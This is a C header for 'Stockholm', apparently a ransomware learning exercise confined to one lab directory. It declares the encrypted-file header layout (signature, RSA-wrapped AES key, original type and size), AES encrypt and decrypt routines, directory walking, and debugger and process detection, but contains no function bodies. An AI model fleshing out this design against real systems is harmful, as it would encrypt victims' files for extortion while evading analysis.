#ifndef STOCKHOLM_H
# define STOCKHOLM_H

# include <stdio.h>
# include <stdlib.h>
# include <fcntl.h>
# include <unistd.h>
# include <stdint.h>
# include <sys/mman.h>      // For mapping
# include <elf.h>           // For ELF header
# include <string.h>
# include <time.h>          // For rand & srand (encryption key generation)
# include <dirent.h>        // For looping through directory
# include <stdbool.h>
# include <sys/stat.h>      // For checking if directory
# include <openssl/aes.h>   // For AES key generation
# include <openssl/rand.h>
# include <getopt.h>        // For argv parsing

# include "ascii_format.h"


/*------------------------ Defines, enum, struct --------------------------*/

// About the program
# define SH_PROG_VERSION        "1.1.3"
# define SH_PROG_AUTHOR         "d."
# define SH_PROG_NAME           "Stockholm"

// Paths of the target directories
# define SH_TARGET_ARRAY_SIZE   1
# define SH_TARGET_PATHS        { "/home/mint/infection/" }

// Unhandled paths
# define SH_UNHANDLED_DIRS_ARRAY_SIZE   2
# define SH_UNHANDLED_DIRS      { ".", ".." }

// Returns
enum e_returns
{
    SH_SUCCESS,
    SH_ERROR
};

// Maximum amount of handled files on a directory
# define SH_MAX_FILES           1024

// Charset used for the encryption key
# define SH_KEYCHARSET          "abcdefghijklmnopqrstuvwxyz" \
                                "ABCDEFGHIJKLMNOPQRSTUVWXYZ" \
                                "0123456789"

// Signature injected in the target files's Stockholm header
# define SH_SIGNATURE           "STOCKHLM"
# define SH_STOCKHLM_EXT        "ft"
# define SH_STOCKHLM_EXT_SIZE    3
# define SH_AES_KEY_SIZE         16
# define SH_AES_BLOCK_SIZE       16

enum e_modes
{
    // Display detailed notifications
    SH_VERBOSE                  = 1,
    SH_REVERSE                  = 2
};

enum e_stockhlm_header
{
    SH_STOCKHLM_HEADER_SIZE      = 0x0118,
    SH_MAGICNBR_SIZE             = 8,
    SH_ENCRYPT_KEY_SIZE          = 256,

    // Header offsets
    SH_HDR_OFF_SIGN             = 0x0,
    SH_HDR_OFF_ENCRYPT_KEY_SIZE = 0x8,
    SH_HDR_OFF_ENCRYPT_KEY      = 0xc,
    SH_HDR_OFF_FILETYPE         = 0x10c,
    SH_HDR_OFF_FILESIZE         = 0x110
};

/*
 * This is the Stockholm header that is written before the original header.
 * It has a size of 0x0118 (= 280) bytes.
 */

typedef struct s_stockhlm_header
{
    // 0x0000 Magic value/signature to identify encrypted files.
    uint8_t     signature[SH_MAGICNBR_SIZE];

    /*
     * 0x0008 Size (in bytes) of the encrypted AES key.
     * Typically 256 bytes for a 2048-bit RSA key.
     */

    uint32_t    encrypted_key_len;

    /*
     * 0x000C RSA encrypted AES file encryption key.
     * AES-128 key (16 bytes) is encrypted using RSA-2048 and stored here.
     *
     * If the asymmetric encryption mode is disabled, a unencrypted
     * AES-128 key is stored.
     */

    uint8_t     encryption_key[SH_ENCRYPT_KEY_SIZE];

    /*
     * 0x010C File type internal to this program.
     * 
     * This is the original file type of the encrypted file.
     * It is used during decryption to restore file format.
     */

    uint32_t    original_filetype;

    // 0x0110 Original file size
    uint64_t    original_filesize;

    // 0x0118 Encrypted file contents (AES-128 CBC)
}               t_stockhlm_header;

/*---------------------------- Global variables ---------------------------*/

typedef struct s_env
{
    unsigned char       *mapped_data; // file is mapped in memory here
    uint16_t            modes;        // options given from command line
    t_stockhlm_header   stockhlm_header;
    size_t              encrypted_filesize;
    unsigned char       *encryption_key;
    unsigned char       *decryption_key;
}   t_env;

/*---------------------------- Function prototypes ------------------------*/

void    parse_argv(t_env *env, int argc, char *argv[]);
void    detect_silent_mode(t_env *env, int argc, char *argv[]);

char    *get_filename(char *argv[]);
int     map_file_into_memory(t_env *env, const char *filename);
int     process_mapped_data(t_env *env);
int     write_processed_data_to_file(t_env *env, const char *target_path);

/*---------------------------- cryptography ------------------------*/

void    xor_with_additive_cipher(
    void *key, size_t key_length, void *data, size_t data_length, int mode);

int     aes_encrypt_data(unsigned char *data, size_t data_len, \
    const unsigned char *key, unsigned char *iv);
int     aes_decrypt_data(unsigned char *data, size_t data_len, \
    const unsigned char *key, unsigned char *iv);
unsigned char    *keygen(const char *_charset, size_t strength);
unsigned char    *get_encryption_key(t_env *env);

/*---------------------------- process checkers ------------------------*/

bool    pc_is_debugger_attached(void);
bool    pc_is_process_running(const char *process_name);

/*---------------------------- file handling ------------------------*/

bool    is_extension_handled(t_env *env, char *filepath);
void    handle_dir(t_env *env, char *target_dir_path);

#endif
